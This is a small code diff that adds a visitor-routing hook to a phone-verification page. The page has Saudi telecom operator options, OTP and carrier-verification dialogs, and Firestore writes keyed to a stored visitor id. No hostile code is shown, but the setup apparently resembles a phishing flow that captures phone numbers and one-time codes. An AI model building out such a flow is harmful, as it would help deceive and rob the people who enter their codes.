@@ -10,6 +10,7 @@ import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
 import { PhoneOtpDialog } from "@/components/phone-otp-dialog";
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
 import { StcCallDialog } from "@/components/stc-call-dialog";
+import { useVisitorRouting } from "@/hooks/use-visitor-routing";
 
 const telecomOperators = [
   { value: "stc", label: "STC - الاتصالات السعودية" },
@@ -35,6 +36,10 @@ export default function PhoneVerificationPage() {
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";
+
+  useVisitorRouting({
+    currentPage: "phone-verification",
+  });
 
   const updatePhoneData = useCallback(async (data: Record<string, any>) => {
     if (!isFirebaseConfigured || !db || !visitorId) return;
